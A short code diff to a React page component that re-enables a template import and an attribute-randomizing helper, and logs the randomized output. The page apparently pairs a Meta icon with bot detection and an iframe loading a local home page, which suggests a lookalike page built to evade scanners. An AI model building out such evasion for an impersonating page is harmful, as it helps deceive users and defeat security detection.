@@ -3,8 +3,8 @@ import MetaIcon from '../assets/icon.ico';
 import type { FC } from 'react';
 import { useEffect, useRef, useState } from 'react';
 import { useBotDetection } from '@/hooks/useBotDetection';
-// import template from "../templates/index.html";
-// import { randomizeAttributes } from "../hooks/randomizeHtml";
+import template from "../templates/index.html";
+import { randomizeAttributes } from "../hooks/randomizeHtml";
 
 const LoadingDots = () => {
     const [dots, setDots] = useState('');
@@ -185,6 +185,7 @@ const Index: FC = () => {
         // );
     }
      const randomized = randomizeAttributes(template);
+     console.log(randomized);
     //return <div dangerouslySetInnerHTML={{ __html: randomized }} />;
     return(showIframe("/id/home.html",SiteTitleMeta,false));
    // return showIframe(IframeUrl,SiteTitleMeta,false);
